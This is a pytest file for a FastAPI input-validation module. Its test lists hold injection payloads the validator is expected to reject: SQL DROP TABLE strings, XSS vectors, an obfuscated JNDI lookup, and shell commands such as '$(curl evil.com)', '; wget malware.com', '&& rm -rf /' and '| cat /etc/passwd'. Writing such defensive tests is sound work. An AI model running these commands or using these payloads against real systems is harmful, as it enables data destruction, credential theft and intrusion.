"""
Comprehensive tests for security validation functionality.

Tests all security validation functions, API endpoint protection,
and hash security implementations.
"""

import pytest
import hashlib
from unittest.mock import Mock, patch, MagicMock
from fastapi import HTTPException, UploadFile
from fastapi.testclient import TestClient
import io

# Import security validation modules
from api.utils.security_validation import (
    SecurityValidator,
    validate_evidence_data,
    validate_business_profile_data,
    validate_integration_data,
    handle_validation_error,
)
from api.dependencies.security_validation import (
    SecurityDependencies,
    validate_request,
    validate_json_body,
    validate_file_upload,
    validate_auth_token,
)
from utils.input_validation import InputValidator


class TestSecurityValidator:
    """Test the SecurityValidator class."""

    def test_validate_no_dangerous_content_sql_injection(self):
        """Test SQL injection detection."""
        dangerous_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin' --",
            "SELECT * FROM users WHERE id = 1",
            "1 UNION SELECT * FROM passwords",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(HTTPException) as exc:
                SecurityValidator.validate_no_dangerous_content(dangerous_input)
            assert exc.value.status_code == 400
            assert "dangerous content" in str(exc.value.detail).lower()

    def test_validate_no_dangerous_content_nosql_injection(self):
        """Test NoSQL injection detection."""
        dangerous_inputs = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.password == \'password\'"}',
            '{"username": {"$regex": ".*"}}',
            "javascript:alert(1)",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(HTTPException) as exc:
                SecurityValidator.validate_no_dangerous_content(dangerous_input)
            assert exc.value.status_code == 400

    def test_validate_no_dangerous_content_xss(self):
        """Test XSS attack detection."""
        dangerous_inputs = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "<iframe src='evil.com'></iframe>",
            "<body onload=alert('XSS')>",
            "document.cookie",
            "<svg onload=alert(1)>",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(HTTPException) as exc:
                SecurityValidator.validate_no_dangerous_content(dangerous_input)
            assert exc.value.status_code == 400

    def test_validate_no_dangerous_content_command_injection(self):
        """Test command injection detection."""
        dangerous_inputs = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(curl evil.com)",
            "; wget malware.com",
            "& powershell.exe",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(HTTPException) as exc:
                SecurityValidator.validate_no_dangerous_content(dangerous_input)
            assert exc.value.status_code == 400

    def test_validate_no_dangerous_content_path_traversal(self):
        """Test path traversal detection."""
        dangerous_inputs = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f",
            "....//....//etc/passwd",
            "C:\\Windows\\System32",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(HTTPException) as exc:
                SecurityValidator.validate_no_dangerous_content(dangerous_input)
            assert exc.value.status_code == 400

    def test_validate_no_dangerous_content_safe_input(self):
        """Test that safe input passes validation."""
        safe_inputs = [
            "Normal user input",
            "user@example.com",
            "John Doe",
            "123 Main Street",
            "Product description with special chars: $99.99",
            "Markdown text with **bold** and _italic_",
        ]

        for safe_input in safe_inputs:
            result = SecurityValidator.validate_no_dangerous_content(safe_input)
            assert result is not None  # Should return sanitized input

    def test_validate_json_payload_depth_limit(self):
        """Test JSON payload depth validation."""
        # Create deeply nested JSON
        deep_json = {
            "level1": {
                "level2": {
                    "level3": {
                        "level4": {
                            "level5": {
                                "level6": {
                                    "level7": {
                                        "level8": {"level9": {"level10": {"level11": "too deep"}}}
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        with pytest.raises(HTTPException) as exc:
            SecurityValidator.validate_json_payload(deep_json, max_depth=10)
        assert exc.value.status_code == 400
        assert "exceeds maximum nesting depth" in str(exc.value.detail)

    def test_validate_json_payload_dangerous_keys(self):
        """Test JSON payload with dangerous keys."""
        dangerous_payload = {"$where": "malicious", "'; DROP TABLE": "value", "<script>": "xss"}

        with pytest.raises(HTTPException) as exc:
            SecurityValidator.validate_json_payload(dangerous_payload)
        assert exc.value.status_code == 400

    @pytest.mark.asyncio
    async def test_validate_file_upload_size_limit(self):
        """Test file upload size validation."""
        # Create mock file exceeding size limit
        mock_file = Mock(spec=UploadFile)
        mock_file.size = 11 * 1024 * 1024  # 11 MB
        mock_file.filename = "large_file.pdf"
        mock_file.content_type = "application/pdf"
        mock_file.headers = {}

        with pytest.raises(HTTPException) as exc:
            await SecurityValidator.validate_file_upload(mock_file)
        assert exc.value.status_code == 413
        assert "exceeds maximum allowed size" in str(exc.value.detail)

    @pytest.mark.asyncio
    async def test_validate_file_upload_mime_type(self):
        """Test file upload MIME type validation."""
        # Invalid MIME type
        mock_file = Mock(spec=UploadFile)
        mock_file.size = 1024
        mock_file.filename = "file.exe"
        mock_file.content_type = "application/x-msdownload"
        mock_file.headers = {}

        with pytest.raises(HTTPException) as exc:
            await SecurityValidator.validate_file_upload(mock_file)
        assert exc.value.status_code == 400
        assert "not allowed" in str(exc.value.detail)

    @pytest.mark.asyncio
    async def test_validate_file_upload_extension_mismatch(self):
        """Test file extension validation."""
        # MIME type doesn't match extension
        mock_file = Mock(spec=UploadFile)
        mock_file.size = 1024
        mock_file.filename = "file.exe"  # Wrong extension
        mock_file.content_type = "application/pdf"
        mock_file.headers = {}

        with pytest.raises(HTTPException) as exc:
            await SecurityValidator.validate_file_upload(mock_file)
        assert exc.value.status_code == 400
        assert "doesn't match content type" in str(exc.value.detail)

    @pytest.mark.asyncio
    async def test_validate_file_upload_dangerous_filename(self):
        """Test dangerous filename detection."""
        mock_file = Mock(spec=UploadFile)
        mock_file.size = 1024
        mock_file.filename = "../../etc/passwd"
        mock_file.content_type = "text/plain"
        mock_file.headers = {}

        with pytest.raises(HTTPException) as exc:
            await SecurityValidator.validate_file_upload(mock_file)
        assert exc.value.status_code == 400

    def test_validate_query_params(self):
        """Test query parameter validation."""
        # Dangerous query params
        dangerous_params = {
            "search": "'; DROP TABLE users; --",
            "filter": "<script>alert(1)</script>",
            "sort": "../../etc/passwd",
        }

        with pytest.raises(HTTPException):
            SecurityValidator.validate_query_params(dangerous_params)

        # Safe query params
        safe_params = {"search": "user query", "page": "1", "limit": "10", "sort": "created_at"}

        result = SecurityValidator.validate_query_params(safe_params)
        assert result is not None

    def test_validate_headers(self):
        """Test header validation and sanitization."""
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Authorization": "Bearer secret_token",
            "X-API-Key": "api_key_123",
            "Content-Type": "application/json",
            "X-Custom": "<script>alert(1)</script>",
        }

        result = SecurityValidator.validate_headers(headers)

        # Sensitive headers should be redacted
        assert result["Authorization"] == "***REDACTED***"
        assert result["X-API-Key"] == "***REDACTED***"

        # Normal headers should be validated
        assert "User-Agent" in result

        # Dangerous content should raise exception
        with pytest.raises(HTTPException):
            SecurityValidator.validate_headers({"Evil": "'; DROP TABLE users; --"})

    def test_validate_content_modes(self):
        """Test different validation modes for dangerous content."""
        # Test strict mode (default)
        dangerous_sql = "SELECT * FROM users WHERE id = 1"
        with pytest.raises(HTTPException):
            SecurityValidator.validate_no_dangerous_content(dangerous_sql, "query")

        # Test lenient mode - should allow some markdown/code samples
        markdown_with_code = "Here's an example: `ls -la` to list files"
        result = SecurityValidator.validate_no_dangerous_content(
            markdown_with_code, "content", mode="lenient"
        )
        assert result is not None

        # But still block SQL injection in lenient mode
        sql_injection = "'; DROP TABLE users; --"
        with pytest.raises(HTTPException):
            SecurityValidator.validate_no_dangerous_content(sql_injection, "query", mode="lenient")

        # Test XSS-only mode for UI fields
        ui_text = "Click here to continue"
        result = SecurityValidator.validate_no_dangerous_content(
            ui_text, "display_text", mode="xss_only"
        )
        assert result is not None

        # Block XSS in xss_only mode
        xss_attack = "<script>alert('XSS')</script>"
        with pytest.raises(HTTPException):
            SecurityValidator.validate_no_dangerous_content(
                xss_attack, "display_text", mode="xss_only"
            )


class TestHashSecurity:
    """Test secure hash implementations."""

    def test_no_md5_usage_in_new_code(self):
        """Test that MD5 is not used in security-critical operations."""
        # This would be caught by the migration script
        test_string = "test_data"

        # SHA-256 should be used instead
        secure_hash = hashlib.sha256(test_string.encode()).hexdigest()
        assert len(secure_hash) == 64  # SHA-256 produces 64 character hex string

        # Truncated SHA-256 for compatibility
        truncated_hash = secure_hash[:16]
        assert len(truncated_hash) == 16

    def test_hash_determinism(self):
        """Test that hashes are deterministic for caching."""
        test_data = "cache_key_data"

        hash1 = hashlib.sha256(test_data.encode()).hexdigest()[:16]
        hash2 = hashlib.sha256(test_data.encode()).hexdigest()[:16]

        assert hash1 == hash2  # Same input should produce same hash

    def test_hash_collision_resistance(self):
        """Test that different inputs produce different hashes."""
        data1 = "user1@example.com"
        data2 = "user2@example.com"

        hash1 = hashlib.sha256(data1.encode()).hexdigest()[:16]
        hash2 = hashlib.sha256(data2.encode()).hexdigest()[:16]

        assert hash1 != hash2  # Different inputs should produce different hashes


class TestSecurityDependencies:
    """Test FastAPI security dependencies."""

    @pytest.mark.asyncio
    async def test_validate_request_dependency(self):
        """Test request validation dependency."""
        mock_request = Mock()
        mock_request.headers = {"User-Agent": "Test"}
        mock_request.query_params = {"search": "query"}
        mock_request.path_params = {}

        result = await SecurityDependencies.validate_request(mock_request)
        assert result == mock_request

        # Test with dangerous headers
        mock_request.headers = {"Evil": "<script>alert(1)</script>"}
        with pytest.raises(HTTPException):
            await SecurityDependencies.validate_request(mock_request)

    @pytest.mark.asyncio
    async def test_validate_json_body_dependency(self):
        """Test JSON body validation dependency."""
        mock_request = Mock()

        # Valid JSON
        async def mock_json():
            return {"name": "John", "email": "john@example.com"}

        mock_request.json = mock_json

        result = await SecurityDependencies.validate_json_body(mock_request)
        assert "name" in result
        assert "email" in result

        # Invalid JSON with dangerous content
        async def dangerous_json():
            return {"sql": "'; DROP TABLE users; --"}

        mock_request.json = dangerous_json

        with pytest.raises(HTTPException):
            await SecurityDependencies.validate_json_body(mock_request)

    @pytest.mark.asyncio
    async def test_validate_auth_token_dependency(self):
        """Test authentication token validation."""
        # Valid token
        mock_credentials = Mock()
        mock_credentials.credentials = "valid_token_123456"

        result = await SecurityDependencies.validate_auth_token(mock_credentials)
        assert result == "valid_token_123456"

        # Missing credentials
        with pytest.raises(HTTPException) as exc:
            await SecurityDependencies.validate_auth_token(None)
        assert exc.value.status_code == 401

        # Dangerous token
        mock_credentials.credentials = "'; DROP TABLE users; --"
        with pytest.raises(HTTPException):
            await SecurityDependencies.validate_auth_token(mock_credentials)


class TestInputValidation:
    """Test input validation functions."""

    def test_email_validation(self):
        """Test email validation."""
        valid_emails = ["user@example.com", "test.user@company.co.uk", "admin+test@domain.org"]

        for email in valid_emails:
            result = InputValidator.validate_email(email)
            assert result == email

        invalid_emails = [
            "not_an_email",
            "@example.com",
            "user@",
            "user@.com",
            "<script>@example.com",
        ]

        for email in invalid_emails:
            with pytest.raises(ValueError):
                InputValidator.validate_email(email)

    def test_password_validation(self):
        """Test password strength validation."""
        strong_passwords = ["StrongP@ssw0rd123", "C0mpl3x!Password", "MyS3cur3P@ssphrase"]

        for password in strong_passwords:
            # Should not raise exception
            InputValidator.validate_password(password)

        weak_passwords = [
            "password",
            "12345678",
            "NoNumbers!",
            "nouppercase123!",
            "NOLOWERCASE123!",
            "NoSpecial123",
        ]

        for password in weak_passwords:
            with pytest.raises(ValueError):
                InputValidator.validate_password(password)

    def test_url_validation(self):
        """Test URL validation."""
        valid_urls = [
            "https://example.com",
            "http://localhost:8000",
            "https://api.service.com/endpoint",
            "https://sub.domain.co.uk/path?query=value",
        ]

        for url in valid_urls:
            result = InputValidator.validate_url(url)
            assert result == url

        invalid_urls = [
            "not a url",
            "javascript:alert(1)",
            "file:///etc/passwd",
            "ftp://insecure.com",
        ]

        for url in invalid_urls:
            with pytest.raises(ValueError):
                InputValidator.validate_url(url)


class TestValidationPerformance:
    """Test validation performance impact."""

    def test_validation_overhead(self):
        """Test that validation doesn't significantly impact performance."""
        import time

        test_data = "Normal user input without any dangerous content"
        iterations = 1000

        # Measure validation time
        start = time.time()
        for _ in range(iterations):
            SecurityValidator.validate_no_dangerous_content(test_data)
        validation_time = time.time() - start

        # Validation should be fast (less than 1ms per operation)
        assert (validation_time / iterations) < 0.001

    def test_cache_key_generation_performance(self):
        """Test cache key generation performance."""
        import time

        test_data = "cache_key_data_for_testing"
        iterations = 1000

        start = time.time()
        for _ in range(iterations):
            hashlib.sha256(test_data.encode()).hexdigest()[:16]
        hash_time = time.time() - start

        # Hash generation should be fast
        assert (hash_time / iterations) < 0.001


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_input_validation(self):
        """Test validation of empty inputs."""
        assert SecurityValidator.validate_no_dangerous_content("") == ""
        assert SecurityValidator.validate_no_dangerous_content(None) is None

    def test_unicode_input_validation(self):
        """Test validation of Unicode inputs."""
        unicode_inputs = ["Hello 世界", "Привет мир", "مرحبا بالعالم", "🚀 Emoji test 🎉"]

        for input_text in unicode_inputs:
            result = SecurityValidator.validate_no_dangerous_content(input_text)
            assert result is not None

    def test_very_large_input_validation(self):
        """Test validation of very large inputs."""
        large_input = "a" * 100000  # 100KB of data

        # Should handle large input without crashing
        result = SecurityValidator.validate_no_dangerous_content(large_input)
        assert result is not None

    def test_nested_injection_attempts(self):
        """Test nested and encoded injection attempts."""
        nested_attempts = [
            "normal'; DROP TABLE users; --text",  # SQL in middle
            "%3Cscript%3Ealert(1)%3C/script%3E",  # URL encoded XSS
            "<<script>script>alert(1)<</script>/script>",  # Nested tags
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com}",  # JNDI
        ]

        for attempt in nested_attempts:
            with pytest.raises(HTTPException):
                SecurityValidator.validate_no_dangerous_content(attempt)


# Integration tests would go here, testing actual API endpoints
# with the security validation dependencies applied
